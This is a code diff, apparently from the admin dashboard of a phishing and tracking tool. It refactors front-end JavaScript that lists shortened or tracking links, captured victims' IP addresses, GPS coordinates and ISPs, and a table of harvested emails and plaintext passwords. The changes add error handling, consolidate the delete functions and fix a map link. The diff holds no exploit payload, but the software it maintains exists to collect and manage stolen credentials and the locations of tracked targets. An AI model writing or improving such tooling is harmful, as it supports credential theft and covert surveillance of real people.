@@ -78,9 +78,10 @@
             if (response.status === 401) {
                 localStorage.removeItem('authToken');
                 window.location.href = '/login.html';
+                throw new Error('Unauthorized');
             }
             if (!response.ok) {
-                const errData = await response.json();
+                const errData = await response.json().catch(() => ({ message: 'Request failed with status: ' + response.status }));
                 throw new Error(errData.message || 'Request failed');
             }
             return response.json();
@@ -100,7 +101,7 @@
                         <td>${link.id}</td>
                         <td class="highlight">${link.username}</td>
                         <td>${link.link_type}</td>
-                        <td><a href="${link.original_url}" target="_blank">${link.original_url.substring(0, 40)}...</a></td>
+                        <td><a href="${link.original_url}" target="_blank" title="${link.original_url}">${link.original_url.substring(0, 40)}...</a></td>
                         <td>${link.click_count}</td>
                         <td>${link.expires_at ? new Date(link.expires_at).toLocaleString('id-ID') : 'Never'}</td>
                     </tr>`;
@@ -115,9 +116,9 @@
                 container.innerHTML = `<p class="error">> NO LOCATIONS DATA FOUND.</p>`;
                 return;
             }
-            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>IP</th><th>Location</th><th>Coords</th><th>ISP</th><th>Aksi</th></tr></thead><tbody>`;
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>IP</th><th>Location</th><th>Coords</th><th>ISP</th><th>Action</th></tr></thead><tbody>`;
             data.forEach(loc => {
-                const mapUrl = `http://googleusercontent.com/maps/google.com/9{loc.latitude},${loc.longitude}`;
+                const mapUrl = `http://googleusercontent.com/maps.google.com/?q=${loc.latitude},${loc.longitude}`;
                 html += `
                     <tr id="location-${loc.id}">
                         <td>${new Date(loc.created_at).toLocaleString('id-ID')}</td>
@@ -126,7 +127,7 @@
                         <td>${loc.city || 'N/A'}, ${loc.country || 'N/A'}</td>
                         <td><a href="${mapUrl}" target="_blank">${loc.latitude}, ${loc.longitude}</a></td>
                         <td>${loc.isp || 'N/A'}</td>
-                        <td><button class="hacker-button small red" onclick="deleteLocation(${loc.id}, this)">[ DELETE ]</button></td>
+                        <td><button class="hacker-button small red" onclick="deleteEntry('location', ${loc.id})">[ DELETE ]</button></td>
                     </tr>`;
             });
             html += `</tbody></table>`;
@@ -139,7 +140,7 @@
                 container.innerHTML = `<p class="error">> NO CREDENTIALS DATA FOUND.</p>`;
                 return;
             }
-            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>IP</th><th>Email</th><th>Password</th><th>Aksi</th></tr></thead><tbody>`;
+            let html = `<table class="hacker-table"><thead><tr><th>Timestamp</th><th>Target ID</th><th>IP</th><th>Email</th><th>Password</th><th>Action</th></tr></thead><tbody>`;
             data.forEach(cred => {
                 html += `
                     <tr id="credential-${cred.id}">
@@ -148,29 +149,18 @@
                         <td>${cred.ip_address}</td>
                         <td class="highlight">${cred.email}</td>
                         <td class="error">${cred.password}</td>
-                        <td><button class="hacker-button small red" onclick="deleteCredential(${cred.id}, this)">[ DELETE ]</button></td>
+                        <td><button class="hacker-button small red" onclick="deleteEntry('credential', ${cred.id})">[ DELETE ]</button></td>
                     </tr>`;
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
         }
         
-        async function deleteLocation(id, element) {
-            if (confirm(`Anda yakin ingin menghapus data lokasi dengan ID: ${id}?`)) {
+        async function deleteEntry(type, id) {
+            if (confirm(`Anda yakin ingin menghapus data ${type} dengan ID: ${id}?`)) {
                 try {
-                    await fetchProtected(`/api/alldata/location/${id}`, { method: 'DELETE' });
-                    element.closest('tr').remove();
-                } catch (error) {
-                    alert(`Gagal menghapus data: ${error.message}`);
-                }
-            }
-        }
-
-        async function deleteCredential(id, element) {
-            if (confirm(`Anda yakin ingin menghapus data kredensial dengan ID: ${id}?`)) {
-                try {
-                    await fetchProtected(`/api/alldata/credential/${id}`, { method: 'DELETE' });
-                    element.closest('tr').remove();
+                    await fetchProtected(`/api/alldata/${type}/${id}`, { method: 'DELETE' });
+                    document.getElementById(`${type}-${id}`).remove();
                 } catch (error) {
                     alert(`Gagal menghapus data: ${error.message}`);
                 }
@@ -185,7 +175,7 @@
                     try {
                         await fetchProtected('/api/alldata/all', { method: 'DELETE' });
                         alert('Semua data pelacakan berhasil dihapus.');
-                        location.reload();
+                        loadAllData();
                     } catch (error) {
                         alert(`Gagal menghapus semua data: ${error.message}`);
                     }
@@ -205,9 +195,9 @@
             
             const queryString = params.toString();
 
-            fetchProtected(`/api/alldata/links?${queryString}`).then(renderLinksTable);
-            fetchProtected(`/api/alldata/locations?${queryString}`).then(renderLocationsTable);
-            fetchProtected(`/api/alldata/credentials?${queryString}`).then(renderCredentialsTable);
+            fetchProtected(`/api/alldata/links?${queryString}`).then(renderLinksTable).catch(err => console.error('Failed to load links:', err.message));
+            fetchProtected(`/api/alldata/locations?${queryString}`).then(renderLocationsTable).catch(err => console.error('Failed to load locations:', err.message));
+            fetchProtected(`/api/alldata/credentials?${queryString}`).then(renderCredentialsTable).catch(err => console.error('Failed to load credentials:', err.message));
         }
 
         document.addEventListener('DOMContentLoaded', () => {
